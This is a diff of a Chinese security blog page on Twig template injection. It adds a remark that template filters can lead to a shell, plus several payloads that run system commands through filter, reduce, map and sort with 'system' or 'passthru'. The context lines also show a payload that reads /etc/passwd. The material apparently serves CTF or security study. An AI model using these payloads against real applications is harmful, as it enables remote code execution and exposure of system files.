@@ -392,7 +392,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    2.1k
                 </div>
                 
 
@@ -551,7 +551,8 @@ da%22
 <p>转义HTML属性字符串</p>
 <h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>选择元素</p>
 <pre><code>{{[1,2,3,4,5,6,7]|filter(i=&gt;i&gt;2)|join('')}}
-3,4,5,6,7 </code></pre><h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>返回第一个数组，<code>{}</code>,字符串 的内容</p>
+3,4,5,6,7 </code></pre><p>这个也可以传入 <code>function</code> ，也是可以函数执行 getshell的</p>
+<h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>返回第一个数组，<code>{}</code>,字符串 的内容</p>
 <pre><code>{{ [1, 2, 3, 4]|first }} \\1
 {{ { a: 1, b: 2, c: 3, d: 4 }|first }} \\1
 {{ '1234'|first }} \\1</code></pre><h4 id="last-和first对应"><a href="#last-和first对应" class="headerlink" title="last 和first对应"></a>last 和first对应</h4><h4 id="format-占位符号"><a href="#format-占位符号" class="headerlink" title="format 占位符号"></a>format 占位符号</h4><pre><code>{{'南梦师傅 %s'|format('tql')}}
@@ -614,7 +615,11 @@ http://127.0.0.1:8000/_profiler/open?file=/tmp/111&amp;amp;line=1#line1 </code><
 <p><strong>所以正确的应该是</strong></p>
 <pre><code>{{['cat${IFS}/etc/passwd']|filter('system')|join('')}}</code></pre><p>或者</p>
 <pre><code>
-{{['id']|map('passthru')}}"@aaa.bbb</code></pre><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>仅仅 </p>
+{{['id']|map('passthru')}}"@aaa.bbb</code></pre><p>或者</p>
+<pre><code>{{["id", 0]|reduce("passthru")}}
+
+{{[0, 0]|reduce("system", "id")|join(",")}}</code></pre><p>或者</p>
+<pre><code>{{["id"]|filter('system')}}</code></pre><pre><code>{{["id", 0]|sort("system")|join(",")}}</code></pre><h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>仅仅 </p>
 <pre><code>{{app.request.files.get(key}}</code></pre><p>得到的是 临时文件名字</p>
 <p><strong>然后下面是文件写入</strong></p>
 <p>需要使用 multipart 文件上传</p>
@@ -1068,7 +1073,7 @@ dasd
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">12.3k</span>&nbsp;字
+                class="white-color">12.4k</span>&nbsp;字
             
             
             
